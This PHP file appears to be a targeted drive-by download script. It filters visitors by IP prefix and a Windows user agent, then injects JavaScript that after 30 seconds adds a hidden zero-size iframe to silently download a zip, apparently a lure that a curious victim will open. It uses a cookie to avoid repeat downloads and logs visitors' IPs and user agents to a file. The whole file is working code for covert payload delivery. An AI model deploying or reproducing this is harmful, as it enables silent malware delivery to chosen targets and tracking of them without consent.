<?php
// can only download one time
$cookie_origin = "cloudswordSpecialCookie";
if (@$_COOKIE['ip'] == $cookie_origin) {
	die();
}
setcookie("ip", $cookie_origin, time() + 1333 * 333);

//specific ip cidr can download
$addres = array("ip1" => "xxx.xxx.xxx", "ip2" => "yyy.yyy.yyy", "ip3" => "127.0.0");

$ip = $_SERVER['REMOTE_ADDR'];
if($ip=="::1"){
	$ip="127.0.0.1";
}
$ipc=explode(".",$ip,-1);
$ip_cdir=join('.',$ipc);

$searchip = array_search($ip_cdir, $addres);

$ua = $_SERVER['HTTP_USER_AGENT'];
// echo $ua;


// Only Windows OS can download
// after 30000ms (0.5 min) the download progress start in background, and download a zip which someone curious will release it.

// Plan A
// Use download signal file to prevent downloading again
/*
if (strpos($ua, 'Windows')) {
	if (isset($searchip)) {
		$signalFile = fopen("1.txt", "r");
		if (!isset($signalFile)) {
			echo "<script>setTimeout(function(){var body = document.getElementsByTagName(\"body\");var div = document.createElement(\"div\");div.innerHTML='<iframe src=\"http://127.0.0.1:8000/1.zip\" width=\"0\" height=\"0\"></iframe>';document.body.appendChild(div);},30000);</script>";
			$myfile = fopen("1.txt", "w");
			$txt = "ddddd";
			fwrite($myfile, $txt);
			fclose($myfile);
		} else {
			$content = fread($signalFile, filesize("1.txt"));
			if ($content == "ddddd") {
				die();
			} else {
				echo "<script>setTimeout(function(){var body = document.getElementsByTagName(\"body\");var div = document.createElement(\"div\");div.innerHTML='<iframe src=\"http://127.0.0.1:8000/1.zip\" width=\"0\" height=\"0\"></iframe>';document.body.appendChild(div);},30000);</script>";
				$myfile = fopen("1.txt", "w");
				$txt = "ddddd";
				fwrite($myfile, $txt);
				fclose($myfile);
			}
		}
	}
}
*/

// Plan B
// Use cookie to prevent downloading again

if (strpos($ua, 'Windows')) {
	if (isset($searchip)) {
		echo "<script>setTimeout(function(){var body = document.getElementsByTagName(\"body\");var div = document.createElement(\"div\");div.innerHTML='<iframe src=\"http://127.0.0.1:8000/1.zip\" width=\"0\" height=\"0\"></iframe>';document.body.appendChild(div);},30000);</script>";
	}
}



// log
$fp = fopen("iplog.txt", "at");
fputs($fp, "TIME: " . date('Y/m/d H:i:s') . "  IP: " . $ip . "   UA: " . $ua . "   ref: " . $ref . "\n");
fclose($fp);
